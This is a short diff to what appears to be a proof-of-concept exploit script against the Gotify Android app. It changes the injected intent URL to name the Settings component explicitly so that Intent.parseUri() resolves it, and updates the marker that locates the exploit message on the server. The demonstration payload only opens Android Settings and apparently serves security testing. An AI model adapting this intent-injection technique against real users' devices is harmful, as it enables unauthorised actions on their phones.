@@ -40,11 +40,14 @@ GOTIFY_USER = None  # Set from metadata.json
 GOTIFY_PASS = None  # Set from metadata.json
 PACKAGE = "com.github.gotify"
 
-# The intent URL that launches Android Settings
-SETTINGS_INTENT_URL = "intent:#Intent;action=android.settings.SETTINGS;end"
+# The intent URL that launches Android Settings.
+# Uses explicit component so Intent.parseUri() bypasses intent-filter
+# matching (an action-only intent gets spurious data=Uri("intent:") from
+# the base URI, which prevents filter resolution).
+SETTINGS_INTENT_URL = "intent:#Intent;component=com.android.settings/.Settings;end"
 
 # Marker to find the exploit message on the server
-EXPLOIT_CALLBACK_MARKER = "android.settings.SETTINGS"
+EXPLOIT_CALLBACK_MARKER = "com.android.settings"
 
 
 # ---------------------------------------------------------------------------
